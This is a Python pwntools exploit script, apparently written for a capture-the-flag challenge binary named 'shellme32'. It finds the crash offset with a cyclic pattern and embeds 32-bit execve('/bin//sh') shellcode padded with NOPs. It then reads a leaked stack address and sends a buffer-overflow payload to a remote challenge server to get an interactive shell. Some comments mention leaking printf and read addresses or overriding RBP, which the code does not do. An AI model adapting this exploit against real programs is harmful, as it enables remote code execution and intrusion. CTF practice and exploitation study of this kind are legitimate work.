from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Load Binaries and Respective libc
##########################################################################

elf = ELF('./shellme32')
context.binary = './shellme32'
libc = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
# libc  = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.recvline()
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
esp = core.esp
offset = core.read(esp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

### Find manually
crashOffset = offset	

### 0x7fffffffd7e8 is just some random value in stack space, just so RBP is valid
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
junk = shellcode + nops*(crashOffset - (4+len(shellcode))) # Override RBP

nullbytes = p32(0)

##########################################################################
# Demo ==> 
##########################################################################

# r = elf.process()
r = remote('chal.tuctf.com', 30506)
# gdb.attach(r.pid, """c""")

print(r.readline())
stack_addr = p32(int(r.readline().decode('utf-8').split('\n')[0], 16))

### This Payload prints printf and read addressed and calls main function again
payload = b''.join([junk, \
    stack_addr])

r.sendline(payload)
r.interactive()
